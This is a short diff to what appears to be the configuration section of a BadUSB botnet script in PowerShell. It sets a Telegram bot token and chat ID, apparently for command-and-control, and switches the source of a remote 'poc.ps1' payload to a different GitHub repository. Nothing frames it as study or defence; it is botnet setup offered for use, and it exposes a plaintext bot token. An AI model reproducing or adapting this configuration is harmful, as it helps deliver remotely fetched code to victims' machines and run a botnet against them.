@@ -21,7 +21,7 @@ BOT TELEGRAM:
 
 $BotToken = "1756815852:AAGO_Gwn_Edr661HS_q67DJhIjveCdzJKkQ"
 $ChatID = '181748175'
-$githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
+$githubScript = 'https://raw.githubusercontent.com/akkrevsky/botnet/main/poc.ps1'
 
 
 ###############
